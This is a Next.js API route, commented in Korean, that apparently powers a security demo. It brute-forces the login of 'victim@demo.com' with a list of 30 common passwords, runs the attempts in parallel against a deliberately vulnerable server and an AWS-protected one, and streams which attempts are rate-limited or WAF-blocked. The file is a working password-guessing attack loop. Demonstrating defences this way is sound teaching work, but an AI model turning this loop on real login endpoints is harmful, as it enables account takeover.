import { NextRequest } from 'next/server';

export const dynamic = 'force-dynamic';

const VULNERABLE_URL = process.env.VULNERABLE_API_URL || 'http://localhost:3000';
const AWS_URL = process.env.AWS_API_URL || '';

// 브루트포스에 사용할 패스워드 목록
const PASSWORDS = [
  'password', '123456', 'admin123', 'letmein', 'qwerty',
  'welcome', 'monkey', 'dragon', 'master', 'abc123',
  'pass1234', 'admin', 'iloveyou', 'sunshine', 'princess',
  'football', 'shadow', 'superman', 'michael', 'baseball',
  'trustno1', 'batman', 'access', 'hello123', 'charlie',
  'donald', 'password1', 'qwerty123', 'p@ssw0rd', 'test1234',
];

function sleep(ms: number) {
  return new Promise((r) => setTimeout(r, ms));
}

async function tryLogin(baseUrl: string, password: string, attempt: number) {
  const start = Date.now();
  try {
    const res = await fetch(`${baseUrl}/api/auth/login`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ email: 'victim@demo.com', password }),
      signal: AbortSignal.timeout(6000),
    });
    const latency = Date.now() - start;
    const blocked = res.status === 429 || res.status === 403;
    const label = blocked
      ? res.status === 429 ? 'RATE LIMITED' : 'WAF BLOCKED'
      : res.status === 401
      ? 'REACHED (wrong pw)'
      : res.status === 200
      ? 'LOGIN SUCCESS'
      : `HTTP ${res.status}`;
    return { attempt, status: res.status, latency, blocked, label };
  } catch {
    return {
      attempt,
      status: 0,
      latency: Date.now() - start,
      blocked: false,
      label: 'CONNECTION ERROR',
      error: 'timeout_or_refused',
    };
  }
}

export async function GET(request: NextRequest) {
  const url = new URL(request.url);
  const count = Math.min(parseInt(url.searchParams.get('count') || '100'), 120);

  const encoder = new TextEncoder();
  const { readable, writable } = new TransformStream();
  const writer = writable.getWriter();

  const send = async (data: object) => {
    try {
      await writer.write(encoder.encode(`data: ${JSON.stringify(data)}\n\n`));
    } catch {
      // 클라이언트 연결 끊김
    }
  };

  (async () => {
    try {
      await send({ type: 'start' });

      for (let i = 0; i < count; i++) {
        const password = PASSWORDS[i % PASSWORDS.length];

        // 취약 환경과 AWS 환경을 병렬로 공격
        const [vulnResult, awsResult] = await Promise.all([
          tryLogin(VULNERABLE_URL, password, i + 1),
          AWS_URL
            ? tryLogin(AWS_URL, password, i + 1)
            : Promise.resolve({
                attempt: i + 1,
                status: -1,
                latency: 0,
                blocked: false,
                label: 'AWS URL 미설정',
              }),
        ]);

        await send({ type: 'result', env: 'vulnerable', ...vulnResult });
        await send({ type: 'result', env: 'aws', ...awsResult });

        // 공격 간 딜레이 (너무 빠르면 로컬 rate-limiter가 먼저 막음)
        await sleep(500);
      }

      await send({ type: 'complete' });
    } catch (e) {
      await send({ type: 'error', message: String(e) });
    } finally {
      writer.close();
    }
  })();

  return new Response(readable, {
    headers: {
      'Content-Type': 'text/event-stream',
      'Cache-Control': 'no-cache',
      'Connection': 'keep-alive',
    },
  });
}
